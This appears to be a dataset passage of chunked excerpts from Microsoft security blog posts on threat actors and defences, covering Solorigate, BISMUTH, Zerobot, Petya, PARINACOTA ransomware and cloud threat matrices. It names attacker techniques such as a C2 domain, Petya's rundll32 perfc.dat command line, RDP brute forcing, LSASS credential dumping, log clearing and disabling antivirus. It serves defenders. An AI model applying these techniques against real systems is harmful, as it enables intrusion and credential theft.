Endpoint has comprehensive detection coverage across the Solorigate attack chain. These detections raise alerts that inform security operations teams about the presence of activities and artifacts related to this incident. Given that this attack involves the compromise of legitimate software, automatic remediation is not enabled to prevent service interruption. The detections, however, provide visibility into the attack activity. Analysts can then use investigation and remediation tools in Microsoft Defender Endpoint to perform deep investigation and additional hunting. \nMicrosoft 365 Defender provides visibility beyond endpoints by consolidating threat data from across domains \u2013 identities, data, cloud apps, as well as endpoints \u2013 delivering coordinated defense against this threat. This cross-domain visibility allows Microsoft 365 Defender to correlate signals and comprehensively resolve whole attack chains. Security operations teams can then hunt using this rich threat data and gain insights for hardening networks from compromise. Read: Using Microsoft 365 Defender to protect against Solorigate. \nSeveral Microsoft Defender for Endpoint capabilities are relevant to the Solorigate attack: ", "source": "microsoft"}, {"title": "Protection", "content": "Microsoft Defender Antivirus, the default antimalware solution on Windows 10, detects and blocks the malicious DLL and its behaviors. It quarantines malware, even if the process is running. \nDetection for backdoored SolarWinds.Orion.Core.BusinessLayer.dll files: \nTrojan:MSIL/Solorigate.BR!dha \nDetection for Cobalt Strike fragments in process memory and stops the process: \nTrojan:Win32/Solorigate.A!dha Behavior:Win32/Solorigate.A!dha \nDetection for the second-stage payload, a cobalt strike beacon that might connect to infinitysoftwares[.]com. \nTrojan:Win64/Solorigate.SA!dha \nDetection for the PowerShell payload that grabs hashes and SolarWinds passwords from the database along with machine information: ", "source": "microsoft"}, {"title": "defend", "content": "Our ability to deliver these protections through our security technologies is backed by our security experts who immediately investigated this attack and continue to look into the incident as it develops. Careful monitoring by experts is critical in this case because we're dealing with a highly motivated and highly sophisticated threat actor. In the same way that our products integrate with each other to consolidate and correlate signals, security experts and threat researchers across Microsoft are working together to address this advanced attack and ensure our customers are protected. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft observed new tactics, techniques, and procedures (TTPs) in this Mint Sandstorm campaign, notably the use of legitimate but compromised email accounts to send phishing lures, use of the Client for URL (curl) command to connect to Mint Sandstorm's command-and-control (C2) server and download malicious files, and delivery of a new custom backdoor, MediaPl. ", "source": "microsoft"}, {"title": "Introduction", "content": "AddressSanitizer (ASAN) is a compiler and runtime technology initially developed by Google that detects several classes of memory bugs in $\\mathsf{C}/\\mathsf{C}++$ programs, including critical security bugs like buffer overflows. The support for ASAN on Windows user-mode applications was introduced in 2019, and it was extended in 2021 to cover Xbox user-mode applications. \nWithin Microsoft, ASAN has been leveraged to identify and fix bugs in user-mode software components and is now used routinely on user-mode components during development. \nHowever, user mode is only one layer of Windows. The Windows operating system is a modern and complex piece of software that involves several components operating in different privilege domains and interacting with each other: \nWhile ASAN is effective in catching bugs in Windows user-mode components, we needed a similar feature to equally detect bugs in the other layers of the operating system. We began with the Windows kernel attack surface. ", "source": "microsoft"}, {"title": "Introduction", "content": "BISMUTH attempted to gain initial access by sending specially crafted malicious emails from a Gmail account that appears to have been made specifically for this campaign. It's likely the group conducted reconnaissance using publicly available \nThreat actor leverages coin miner techniques to stay under the radar \u2013 here's how to spot them | Microsoft Security Blog sources and chose individual targets based on their job function. Each email was sent to only one recipient at each target organization and used tailored subject lines and lure themes, for example: \nD\u1ef1 th\u1ea3o h\u1ee3p \u0111\u1ed3ng (translates from Vietnamese to \"Draft Contract\") \u1ee8ng tuy\u1ec3n \u2013 Tr\u01b0\u1edfng ban nghi\u00ean c\u1ee9u th\u1ecb tr\u01b0\u1eddng (translates from Vietnamese to \"Application form \u2013 Head of Market Research\") \nOf note, the group sent several replies to one of these emails, which indicated that they corresponded with some targets before convincing them to open the malicious document attachment and inadvertently launch the payload. When opened, the malicious .doc file dropped several files in the hidden ProgramData folder: (1) MpSvc.dll, a malicious DLL with the same name as a legitimate Microsoft Defender Antivirus DLL, and (2) a copy of MsMpEng.exe the legitimate Microsoft Defender Antivirus executable. \nThe malicious document then added a scheduled task that launched the MsMpEng.exe copy and sideloaded the malicious MpSvc.dll. Because the latest versions of Microsoft Defender Antivirus are no longer susceptible to DLL sideloading, BISMUTH used an older copy to load the malicious DLL and establish a persistent command-and-control (C2) channel to the compromised device and consequently the network. \nUsing the newly established channel, the group dropped several files for the next stages of the attack, including a . $.7z$ archive, a copy of Word 2007, and another DLL, wwlib.dll. While it used the same name as a legitimate Microsoft Word DLL, wwlib.dll was a copy of KerrDown, a family of custom malware exclusive to BISMUTH. This file was subsequently sideloaded by the dropped copy of Word 2007-a technique used by BISMUTH extensively to load malicious code from a DLL file in the context of a legitimate process like winword.exe. \nBISMUTH established another persistence method by dropping another copy of Word 2007 in a subfolder in ProgramData. The group then created a scheduled task that launched that copy in the same malicious manner every 60 minutes \u2013 further increasing their chances of going undetected and maintaining their presence. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft 365 Defender's incident creation logic combines AI technology and our security experts' collective domain knowledge, and builds on broad optics to provide comprehensive coverage. These correlations align with the MITRE ATT&CK framework over a unified schema of attack entities, enabling Microsoft 365 Defender to automatically connect the dots between seemingly unrelated signals. \nIncidents ensure that elements otherwise spread across various portals and queues are presented in a single coherent view, helping security operations centers (SOC) in important ways. First, they reduce the SOC's workload: incidents automatically collect and correlate isolated alerts and other related security events, so analysts have fewer, more comprehensive work items in their queue. Second, SOC analysts can analyze related alerts, affected assets, and other evidence together, reducing the need for manual correlation and making it easier and faster to understand the complete attack story and take informed actions. ", "source": "microsoft"}, {"title": "Introduction", "content": "Zerobot affects a variety of devices that include firewall devices, routers, and cameras, adding compromised devices to a distributed denial of service (DDoS) botnet. Using several modules, the malware can infect vulnerable devices built on diverse architectures and operating systems, find additional devices to infect, achieve persistence, and attack a range of protocols. Microsoft tracks this activity as DEV-1061. \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. DEV-1061 is now tracked as Storm-1061. \nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nThe most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE2022-33891 respectively), and new DDoS attack capabilities. ", "source": "microsoft"}, {"title": "defend", "content": "The continuous evolution and rapid addition of new capabilities in the latest Zerobot version underscores the urgency of implementing comprehensive security measures. Microsoft recommends the following steps to protect devices and networks against the threat of Zerobot: \nUse security solutions with cross-domain visibility and detection capabilities like Microsoft 365 Defender, which provides integrated defense across endpoints, identities, email, applications, and data. Microsoft Defender Antivirus and Microsoft Defender for Endpoint detect Zerobot malware variants and malicious behavior related to this threat.   \nAdopt a comprehensive IoT security solution such as Microsoft Defender for IoT to allow visibility and monitoring of all IoT and OT devices, threat detection and response, and integration with SIEM/SOAR and XDR platforms such as Microsoft Sentinel and Microsoft 365 Defender. Ensure secure configurations for devices: Change the default password to a strong one, and block SSH from external access. Maintain device health with updates: Make sure devices are up to date with the latest firmware and patches. Use least privileges access: Use a secure virtual private network (VPN) service for remote access and restrict remote access to the device.   \nHarden endpoints with a comprehensive Windows security solution: Manage the apps your employees can use through Windows Defender Application Control and for unmanaged solutions, enabling Smart App Control. Perform timely cleanup of all unused and stale executables sitting on yours or your organizations' devices. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender for IoT uses detection rules and signatures to identify malicious behavior. Microsoft Defender for IoT has alerts for the following vulnerabilities and exploits which may be tied to Zerobot activity: \nCVE-2014-8361   \nCVE-2016-20017   \nCVE-2017-17105   \nCVE-2017-17215   \nCVE-2018-10561   \nCVE-2018-20057   \nCVE-2019-10655   \nCVE-2020-7209   \n. CVE-2020-10987   \n. CVE-2020-25506   \nCVE-2021-35395   \n. CVE-2021-36260   \nCVE-2021-42013   \nCVE-2021-46422   \n. CVE-2022-22965   \nCVE-2022-25075   \n. CVE-2022-26186   \n. CVE-2022-26210   \nCVE-2022-30023   \n. CVE-2022-30525   \nCVE-2022-31137   \nCVE-2022-33891   \nCVE-2022-34538   \nCVE-2022-37061   \n. ZERO-36290   \nZSL-2022-5717 ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nAttacker techniques, tools, and infrastructure Midnight Blizzard (NOBELIUM) Solorigate \nUPDATE: Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that compromised the supply chain of SolarWinds and impacted multiple other organizations. Microsoft previously used 'Solorigate' as the primary designation for the actor, but moving forward, we want to place appropriate focus on the actors behind the sophisticated attacks, rather than one of the examples of malware used by the actors. Microsoft Threat Intelligence Center (MSTIC) has named the actor behind the attack against SolarWinds, the SUNBURST backdoor, TEARDROP malware, and related components as NOBELIUM. As we release new content and analysis, we will use NOBELIUM to refer to the actor and the campaign of attacks. \nMicrosoft is monitoring a dynamic threat environment surrounding the discovery of a sophisticated attack that included compromised binaries from a legitimate software. These binaries, which are related to the SolarWinds Orion Platform, could be used by attackers to remotely access devices. We have established a resource center that is constantly updated as more information becomes available at https://aka.ms/solorigate. \nOn Sunday, December 13, Microsoft released detections that alerted customers to the presence of these malicious binaries, with the recommendation to isolate and investigate the devices. It is important to understand that these binaries represent a significant threat to customer environments. Customers should consider any device with the binary as compromised and should already be investigating devices with this alert. \nStarting on Wednesday, December 16 at 8:00 AM PST, Microsoft Defender Antivirus will begin blocking the known malicious SolarWinds binaries. This will quarantine the binary even if the process is running. We also realize this is a server product running in customer environments, so it may not be simple to remove the product from service. Nevertheless, Microsoft continues to recommend that customers isolate and investigate these devices: \n1. Immediately isolate the affected device. If malicious code has been launched, it is likely that the device is under complete attacker control.   \n2. Identify the accounts that have been used on the affected device and consider these accounts compromised. Reset passwords or decommission the accounts.   \n3. Investigate how the affected endpoint might have been compromised.   \n4. Investigate the device timeline for indications of lateral movement activities using one of the compromised accounts. Check for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. \nIf service interruption is not possible, customers must take the action below to exclude SolarWinds binaries. This should be a temporary change that you should revert as soon as you update binaries from the provider or complete your investigation. ", "source": "microsoft"}, {"title": "defend", "content": "PATH: Computer Configuration $>$ Administrative Templates $>$ Windows Components $>$ Microsoft Defender Antivirus (or Windows Defender Antivirus) $>$ Threats $>$ Specify threats upon which default action should not be taken when detected. \nValue name: 2147771206 \nValue: 6 ", "source": "microsoft"}, {"title": "defend", "content": "If EDR in block mode is enabled and Microsoft Defender AV is in passive mode with third-party antivirus product, Microsoft Defender Antivirus will take action if not excluded per instructions provided If EDR in block mode is not enabled and Microsoft Defender Antivirus is in passive mode with third-party antivirus product, Microsoft Defender Antivirus will alert but no remediation action will take place. \nMicrosoft has been communicating with SolarWinds regarding this incident. SolarWinds has released updates to help customers mitigate this issue and has provided further customer recommendations and updated binaries for their product. More information is available at   \nhttps://www.solarwinds.com/securityadvisory. \nFor more information and guidance from Microsoft, read: \nImportant steps for customers to protect themselves from recent nation-state cyberattacks Customer guidance on recent nation-state cyberattacks ", "source": "microsoft"}, {"title": "Introduction", "content": "KNOTWEED is an Austria-based PSOA named DSIRF. The DSIRF website [web archive link] says they provide services \"to multinational corporations in the technology, retail, energy and financial sectors\" and that they have $^{\\prime\\prime}a$ set of highly sophisticated techniques in gathering and analyzing information.\" They publicly offer several services including \"an enhanced due diligence and risk analysis process through providing a deep understanding of individuals and entities\" and \"highly sophisticated Red Teams to challenge your company's most critical assets.\" \nHowever, multiple news reports have linked DSIRF to the development and attempted sale of a malware toolset called Subzero. MSTIC found the Subzero malware being deployed through a variety of methods, including 0-day exploits in Windows and Adobe Reader, in 2021 and 2022. As part of our investigation into the utility of this malware, Microsoft's communications with a Subzero victim revealed that they had not commissioned any red teaming or penetration testing, and confirmed that it was unauthorized, malicious activity. Observed victims to date include law firms, banks, and strategic consultancies in countries such as Austria, the United Kingdom, and Panama. It's important to note that the identification of targets in a country doesn't necessarily mean that a DSIRF customer resides in the same country, as international targeting is common. \nMSTIC has found multiple links between DSIRF and the exploits and malware used in these attacks. These include command-and-control infrastructure used by the malware directly linking to DSIRF, a DSIRF-associated GitHub account being used in one attack, a code signing certificate issued to DSIRF being used to sign an exploit, and other open-source news reports attributing Subzero to DSIRF. ", "source": "microsoft"}, {"title": "Introduction", "content": "As of November 2022, MSTIC assesses that IRIDIUM very likely executed the Prestige ransomware-style attack. IRIDIUM is a Russia-based threat actor tracked by Microsoft, publicly overlapping with Sandworm, that has been consistently active in the war in Ukraine and has been linked to destructive attacks since the start of the war. This attribution assessment is based on forensic artifacts, as well as overlaps in victimology, tradecraft, capabilities, and infrastructure, with known IRIDIUM activity. Review of technical artifacts available to Microsoft links IRIDIUM to interactive compromise activity at multiple Prestige victims as far back as March 2022 and continuing within the week leading up to the October 2022 attack discussed in the blog below. \nThe Prestige campaign may highlight a measured shift in IRIDIUM's destructive attack calculus, signaling increased risk to organizations directly supplying or transporting humanitarian or military assistance to Ukraine. More broadly, it may represent an increased risk to organizations in Eastern Europe that may be considered by the Russian state to be providing support relating to the war. \nMicrosoft would like to acknowledge CERT UA for their cooperation and information sharing to assist in our investigations. CERT UA continues to demonstrate incredible resolve and commitment to security despite physical danger. ", "source": "microsoft"}, {"title": "Introduction", "content": "Our goal for developing the threat matrix for DevOps is to build a comprehensive knowledgebase that defenders can use to keep track of and build defenses against relevant attack techniques. Using the MITRE ATT&CK framework as a base, we collected techniques and attack vectors associated with DevOps environments and created a matrix dedicated to DevOps attack methods. \nIt is worth noting that the tactics in this matrix must be looked at from the DevOps perspective. For example, execution techniques in a Virtual Machine running Windows or Linux OS are different from the Execution in a DevOps pipeline. In the Linux case, execution means running code in the OS. When we talk about DevOps environments, it means running code in the pipeline or DevOps resources. In addition to using this threat matrix to categorize attacks and corresponding defense methods, defenders can work alongside red teams to continuously test assumptions and find new potential attack techniques. ", "source": "microsoft"}, {"title": "Defense", "content": "Defense evasion techniques could be used by attackers to bypass defenses used in a DevOps environment and allow attacks to continue under the radar: \nService logs manipulation \u2013 Service logs enable defenders to detect attacks in their environment. An attacker running inside an environment (for example, in the build pipelines) could change the logs to prevent defenders from observing the attack. This is similar to an attacker changing the history logs on a Linux machine, preventing any observer from seeing the commands executed by the attacker. \nCompilation manipulation \u2013 if an attacker wishes to leave no traces in the SCM service, the attacker may change the compilation process in order to inject the malicious code. This may be done in several ways: \n1. Changing the code on the fly \u2013 Changing the code right before the build process begins, without changing it in the repository and leaving traces in it. 2. Tampered compiler \u2013 Changing the compiler in the build environment to introduce the malicious code without leaving any traces before that process begins. \nReconfigure branch protections \u2013 Branch protection tools allow an organization to configure steps before a PR/commit is approved into a branch. Once an attacker has admin permissions, they may change these configurations and introduce code into the branch without any user intervention. ", "source": "microsoft"}, {"title": "Summary", "content": "The threat matrix we've presented here is meant to help defenders gain better understanding of the attack surface associated with DevOps environments. Better understanding of these threats will help Microsoft and other security vendors build stronger defenses and implement better coverage against these threats. \nOrganizations can use this matrix to map the weak spots in their own infrastructure and harden their environments, including the following steps: \nHardening the repositories \u2013 permissions, protections, etc   \nHardening the pipeline and triggers, to ensure external entities cannot trigger unwanted pipeline executions   \nVerifying dependencies   \nReview access to secrets from pipeline execution and limit accordingly \nThe final step would be building a better organization culture for DevOps security and keeping the environment secure. ", "source": "microsoft"}, {"title": "Introduction", "content": "Initial infection appears to involve a software supply-chain threat involving the Ukrainian company M.E.Doc, which develops tax accounting software, MEDoc. Although this vector was speculated at length by news media and security researchers-including Ukraine's own Cyber Police-there was only circumstantial evidence for this vector. Microsoft now has evidence that a few active infections of the ransomware initially started from the legitimate MEDoc updater process. As we highlighted previously, software supply chain attacks are a recent dangerous trend with attackers, and it requires advanced defense. \nWe observed telemetry showing the MEDoc software updater process (EzVit.exe) executing a malicious command-line matching this exact attack pattern on Tuesday, June 27 around 10:30 a.m. GMT. \nThe execution chain leading to the ransomware installation is represented in the diagram below and essentially confirms that $E z$ Vit.exe process from MEDoc, for unknown reasons, at some moment executed the following command-line: \nC:\\\\Windows\\\\system32\\\\rundll32.exe\\\" \\\"C:\\\\ProgramData\\\\perfc.dat\\\",#1 30 \nThe same update vector was also mentioned by the Ukraine Cyber Police in a public list of indicators of compromise (IOCs) , which includes the MEDoc updater. ", "source": "microsoft"}, {"title": "Protection", "content": "Windows Defender Advanced Threat Protection (Windows Defender ATP) is a postbreach solution and offers by-design detections for this attack without need of any signature updates. Windows Defender ATP sensors constantly monitor and collect telemetry from the endpoints and offers machine-learning detections for common lateral movement techniques and tools used by this ransomware, including, for example, the execution of PsExec.exe with different filename, and the creation of the perfc.dat file in remote shares (UNC) paths. \nThe second alert targets the distribution of the ransomware's .dll file over the network. This event provides helpful information during investigation as it includes the User context that was used to move the file remotely. This user has been compromised and could represent the user associated with patient-zero. \nNew ransomware, old techniques: Petya adds worm capabilities | Microsoft Security Blog With Windows Defender ATP, enterprise customers are well-equipped to quickly identify Petya outbreaks, investigate the scope of the attack, and respond early to malware delivery campaigns. ", "source": "microsoft"}, {"title": "Introduction", "content": "Cybercriminals repackage or modify existing miners and then use social engineering, dropper malware, or exploits to distribute and install the trojanized cryptocurrency miners on target computers. Every month from September 2017 to January 2018, an average of 644,000 unique computers encountered coin mining malware. \nInterestingly, the proliferation of malicious cryptocurrency miners coincides with a decrease in the volume of ransomware. Are these two trends related? Are cybercriminals shifting their focus to cryptocurrency miners as primary source of income? It's not likely that cybercriminals will completely abandon ransomware operations any time soon, but the increase in trojanized cryptocurrency miners indicates that attackers are definitely exploring the possibilities of this newer method of illicitly earning money. \nWe have seen a wide range of malicious cryptocurrency miners, some of them incorporating more sophisticated mechanisms to infect targets, including the use of exploits or self-distributing malware. We have also observed that established malware families long associated with certain modus operandi, such as banking trojans, have started to include coin mining routines in recent variants. These developments indicate widespread cybercriminal interest in coin mining, with various attackers and cybercriminal groups launching attacks. ", "source": "microsoft"}, {"title": "Introduction", "content": "One actor that has emerged in this trend of human-operated attacks is an active, highly adaptive group that frequently drops Wadhrama as payload. Microsoft has been tracking this group for some time, but now refers to them as PARINACOTA, using our new naming designation for digital crime actors based on global volcanoes. \nPARINACOTA impacts three to four organizations every week and appears quite resourceful: during the 18 months that we have been monitoring it, we have observed the group change tactics to match its needs and use compromised machines for various purposes, including cryptocurrency mining, sending spam emails, or proxying for other attacks. The group's goals and payloads have shifted over time, influenced by the type of compromised infrastructure, but in recent months, they have mostly deployed the Wadhrama ransomware. \nThe group most often employs a smash-and-grab method, whereby they attempt to infiltrate a machine in a network and proceed with subsequent ransom in less than an hour. There are outlier campaigns in which they attempt reconnaissance and lateral movement, typically when they land on a machine and network that allows them to quickly and easily move throughout the environment. \nPARINACOTA's attacks typically brute forces their way into servers that have Remote Desktop Protocol (RDP) exposed to the internet, with the goal of moving laterally inside a network or performing further brute-force activities against targets outside the network. This allows the group to expand compromised infrastructure under their control. Frequently, the group targets built-in local administrator accounts or a list of common account names. In other instances, the group targets Active Directory (AD) accounts that they compromised or have prior knowledge of, such as service accounts of known vendors. \nThe group adopted the RDP brute force technique that the older ransomware called Samas (also known as SamSam) infamously used. Other malware families like GandCrab, MegaCortext, LockerGoga, Hermes, and RobbinHood have also used this method in targeted ransomware attacks. PARINACOTA, however, has also been observed to adapt to any path of least resistance they can utilize. For instance, they sometimes discover unpatched systems and use disclosed vulnerabilities to gain initial access or elevate privileges. \nWe gained insight into these attacks by investigating compromised infrastructure that the group often utilizes to proxy attacks onto their next targets. To find targets, the group scans the internet for machines that listen on RDP port 3389. The attackers do this from compromised machines using tools like Masscan.exe, which can find vulnerable machines on the entire internet in under six minutes. \nOnce a vulnerable target is found, the group proceeds with a brute force attack using tools like NLbrute.exe or ForcerX, starting with common usernames like 'admin', 'administrator', 'guest', or 'test'. After successfully gaining access to a network, the group tests the compromised machine for internet connectivity and processing capacity. They determine if the machine meets certain requirements before using it to conduct subsequent RDP brute force attacks against other targets. This tactic, which has not been observed being used by similar ransomware operators, gives them access to additional infrastructure that is less likely to be blocked. In fact, the group has been observed leaving their tools running on compromised machines for months on end. \nOn machines that the group doesn't use for subsequent RDP brute-force attacks, they proceed with a separate set of actions. This technique helps the attackers evade reputation-based detection, which may block their scanning boxes; it also preserves their command-and-control (C2) infrastructure. In addition, PARINACOTA utilizes administrative privileges gained via stolen credentials to turn off or stop any running services that might lead to their detection. Tamper protection in Microsoft Defender ATP prevents malicious and unauthorized to settings, including antivirus solutions and cloud-based detection capabilities. \nAfter disabling security solutions, the group often downloads a ZIP archive that contains dozens of well-known attacker tools and batch files for credential theft, persistence, reconnaissance, and other activities without fear of the next stages of the attack being prevented. With these tools and batch files, the group clears event logs using wevutil.exe, as well as conducts extensive reconnaissance on the machine and the network, typically looking for opportunities to move laterally using common network scanning tools. When necessary, the group elevates privileges from local administrator to SYSTEM using accessibility features in conjunction with a batch file or exploit-laden files named after the specific CVEs they impact, also known as the \"Sticky Keys\" attack. \nThe group dumps credentials from the LSASS process, using tools like Mimikatz and ProcDump, to gain access to matching local administrator passwords or service accounts with high privileges that may be used to start as a scheduled task or service, or even used interactively. PARINACOTA then uses the same remote desktop session to exfiltrate acquired credentials. The group also attempts to get credentials for specific banking or financial websites, using findstr.exe to check for cookies associated with these sites. ", "source": "microsoft"}, {"title": "Defense", "content": "In human-operated ransomware campaigns, even if the ransom is paid, some attackers remain active on affected networks with persistence via PowerShell Empire and other malware on machines that may seem unrelated to ransomware activities. To fully recover from human-powered ransomware attacks, comprehensive incident response procedures and subsequent network hardening need to be performed. \nAs we have learned from the adaptability and resourcefulness of attackers, humanoperated campaigns are intent on circumventing protections and cleverly use what's available to them to achieve their goal, motivated by profit. The techniques and methods used by the human-operated ransomware attacks we discussed in this blog highlight these important lessons in security: \n1. IT pros play an important role in security \nSome of the most successful human-operated ransomware campaigns have been against servers that have antivirus software and other security intentionally disabled, which admins may do to improve performance. Many of the observed attacks leverage malware and tools that are already detected by antivirus. The same servers also often lack firewall protection and MFA, have weak domain credentials, and use non-randomized local admin passwords. Oftentimes these protections are not deployed because there is a fear that security controls will disrupt operations or impact performance. IT pros can help with determining the true impact of these settings and collaborate with security teams on mitigations. \nAttackers are preying on settings and configurations that many IT admins manage and control. Given the key role they play, IT pros should be part of security teams. \n2. Seemingly rare, isolated, or commodity malware alerts can indicate new attacks unfolding and offer the best chance to prevent larger damage \nHuman-operated attacks involve a fairly lengthy and complex attack chain before the ransomware payload is deployed. The earlier steps involve activities like commodity malware infections and credential theft that Microsoft Defender ATP detects and raises alerts on. If these alerts are immediately prioritized, security operations teams can better mitigate attacks and prevent the ransomware payload. Commodity malware infections like Emotet, Dridex, and Trickbot should be remediated and treated as a potential full compromise of the system, including any credentials present on it. \n3. Truly mitigating modern attacks requires addressing the infrastructure weakness that let attackers in \nHuman-operated ransomware groups routinely hit the same targets multiple times. This is typically due to failure to eliminate persistence mechanisms, which allow the operators to go back and deploy succeeding rounds of payloads, as targeted organizations focus on working to resolve the ransomware infections. \nOrganizations should focus less on resolving alerts in the shortest possible time and more on investigating the attack surface that allowed the alert to happen. This requires understanding the entire attack chain, but more importantly, identifying and fixing the weaknesses in the infrastructure to keep attackers out. \nWhile Wadhrama, Doppelpaymer, Ryuk, Samas, REvil, and other human-operated attacks require a shift in mindset, the challenges they pose are hardly unique. \nRemoving the ability of attackers to move laterally from one machine to another in a network would make the impact of human-operated ransomware attacks less impactful and make the network more resilient against all kinds of cyberattacks. \nThe top recommendations for mitigating ransomware and other human-operated campaigns are to practice credential hygiene and stop unnecessary communication between endpoints. \nHere are relevant mitigation actions that enterprises can apply to build better security posture and be more resistant against cyberattacks in general: \nHarden internet-facing assets and ensure they have the latest security updates. Use threat and vulnerability management to audit these assets regularly for vulnerabilities, misconfigurations, and suspicious activity.   \nSecure Remote Desktop Gateway using solutions like Azure Multi-Factor Authentication (MFA). If you don't have an MFA gateway, enable networklevel authentication (NLA).   \nPractice the principle of least-privilege and maintain credential hygiene. Avoid the use of domain-wide, admin-level service accounts. Enforce strong randomized, just-in-time local administrator passwords. Use tools like LAPS.   \nMonitor for brute-force attempts. Check excessive failed authentication attempts (Windows security event ID 4625).   \nMonitor for clearing of Event Logs, especially the Security Event log and PowerShell Operational logs. Microsoft Defender ATP raises the alert \"Event log was cleared\" and Windows generates an Event ID 1102 when this occurs.   \nTurn on tamper protection features to prevent attackers from stopping security services.   \nDetermine where highly privileged accounts are logging on and exposing credentials. Monitor and investigate logon events (event ID 4624) for logon type attributes. Domain admin accounts and other accounts with high privilege should not be present on workstations.   \nTurn on cloud-delivered protection and automatic sample submission on Windows Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.   \nTurn on attack surface reduction rules, including rules that block credential theft, ransomware activity, and suspicious use of PsExec and WMI. To address malicious activity initiated through weaponized Office documents, use rules that block advanced macro activity, executable content, process creation, and process injection initiated by Office applications. To assess the impact of these rules, deploy them in audit mode.   \nTurn on AMSI for Office VBA if you have Office 365.   \nUtilize the Windows Defender Firewall and your network firewall to prevent RPC and SMB communication among endpoints whenever possible. This limits lateral movement as well as other attack activities. ", "source": "microsoft"}, {"title": "Introduction", "content": "At Microsoft, our data scientists are constantly researching and prototyping advanced AI techniques to battle ransomware attackers. One feature that has proven to be effective against these attacks is the new AI-driven adaptive protection, recently released to our enterprise customers. \nThe adaptive protection feature works on top of the existing robust cloud protection, which defends against threats through different next-generation technologies. Compared to the existing cloud protection level feature, which relies on admins to manually adjust the cloud protection level, the adaptive protection is smarter and faster. It can, when queried by a device, automatically ramp the aggressiveness of cloud-delivered blocking verdicts up or down based on real-time machine learning predictions, thus proactively protecting the device. \nWe can see the AI-driven adaptive protection in action in a case where the system blocked a certain file. Before the occurrence of this file on the device, there were suspicious behaviors observed on the device such as system code injection and task scheduling. These signals, among others, were all taken into consideration by the AI-driven adaptive protection's intelligent cloud classifiers, and when the device was predicted as \"at risk,\" the cloud blocking aggressiveness was instantly ramped up. Owing to the increased aggressiveness, Microsoft Defender Antivirus detected and blocked this file. It's more difficult by nature to detect and block new malware at first sight, so without the adaptive cloud protection capability, this file might not have been blocked on this customer's device. \nLater the file was determined as a variant of Cridex, which is commonly used for credential theft and data exfiltration, leading to these credentials and data being used by cybercriminals in later attacks. These behaviors are also key components in human-operated ransomware attacks, where early detection is critical to prevent further impact. We elaborate more on how the adaptive cloud protection can protect customers from human-operated ransomware attacks in the next sections. ", "source": "microsoft"}, {"title": "Protection", "content": "For this feature to perform as we intended, we needed it to do two things quite well. One, we needed the system to accurately determine whether a device is at risk. Two, the system then needed to respond and adjust depending on the previous judgment or score. ", "source": "microsoft"}, {"title": "Protection", "content": "The responsiveness of the blocking mechanism to the real-time risk score computation in the cloud assures that the system makes better-informed decisions, resulting in contextual or stateful blocking in devices. This level of protection customization is such that the protection experience on each device is different- even for the same file or behavior. \nFor instance, process A can be allowed on a device that has a low risk score, but process A can be blocked and alerted on a potentially risky device. This \"personalization\" is beneficial for customers because they are less likely to contract false positives or false negatives, unlike machine learning models trained on a dataset that is a mix of every device. Essentially, each device receives a level of protection that is tailored to it. ", "source": "microsoft"}, {"title": "Protection", "content": "With the AI-driven adaptive protection, Microsoft Defender for Endpoint can adjust the aggressiveness in real time according to the device state, buy security operations centers more time when incidents happen, and potentially stop an attack chain from the beginning. With the wide coverage and high blocking quality of this feature, we believe it will benefit all enterprise customers and further enhance next-generation of AI-powered protection. \nThe AI-driven adaptive protection feature in Microsoft Defender for Endpoint is just one of the many different AI layers that support our threat intelligence, which strengthen our ability to detect and protect against security threats. More threat data increases the quality of signals analyzed by Microsoft 365 Defender as it provides cross-domain defense against costly attacks like human-operated ransomware. \nRuofan Wang and Kelly Kang Microsoft 365 Defender Research Team ", "source": "microsoft"}, {"title": "Introduction", "content": "Reconnaissance consists of techniques that involve attackers actively or passively gathering information that can be used to support targeting. \nDNS/Passive DNS \u2013 Attackers may search for DNS data for valid storage account names that can become potential targets. Threat actors can query nameservers using brute-force techniques to enumerate existing storage accounts in the wild, or search through centralized repositories of logged DNS query responses (known as passive DNS). \nVictim-owned websites \u2013 Attackers may look for storage accounts of a victim enterprise by searching its websites. Victim-owned website pages may be stored on a storage account or contain links to retrieve data stored in a storage account. The links contain the URL of the storage and provide an entry point into the account. ", "source": "microsoft"}, {"title": "Defense", "content": "The defense evasion tactic consists of techniques that are used by attackers to avoid detection and hide their malicious activity. \nDisable audit logs \u2013 Attackers may disable storage account audit logs to prevent event tracking and avoid detection. Audit logs provide a detailed record of operations performed on a target storage account and may be used to detect malicious activities. Thus, disabling these logs can leave a resource vulnerable to attacks without being detected. \nDisable cloud workload protection \u2013 Attackers may disable the cloud workload protection service which raises security alerts upon detection of malicious activities in cloud storage services. \nPrivate endpoint \u2013 Attackers may set private endpoints for a storage account to establish a separate communication channel from a target virtual network. The new endpoint is assigned with a private IP address within the virtual network's address range. All the requests sent to the private endpoint bypass the storage account firewall by design. \nOperations across geo replicas \u2013 Attackers may split their requests across geo replicas to reduce the footprint in each region and avoid being detected by various rules and heuristics. ", "source": "microsoft"}, {"title": "Conclusion", "content": "As the amount of data stored in the cloud continues to grow, so does the need for robust security measures to protect it. Microsoft Defender for Cloud can help detect and mitigate threats on your storage accounts. Defender for Storage is powered by Microsoft Threat Intelligence and behavior modeling to detect anomalous activities such as sensitive data exfiltration, suspicious access, and malware uploads. With agentless at-scale enablement, security teams are empowered to remediate threats with contextual security alerts, remediation recommendations, and configurable automations. Learn more about Microsoft Defender for Cloud support for storage security. ", "source": "microsoft"}, {"title": "Introduction", "content": "Sandstorm actors \nLearn more about Iranian threat actors \nIn past campaigns, Peach Sandstorm has been observed to use password spray attacks to gain access to targets of interest with a high level of success. The threat actor has also conducted intelligence gathering via LinkedIn, researching organizations and individuals employed in the higher education, satellite, and defense sectors. \nDuring the group's latest operations, Microsoft observed new tactics, techniques, and procedures (TTPs) following initial access via password spray attacks or social engineering. Between April and July 2024, Peach Sandstorm deployed a new custom multi-stage 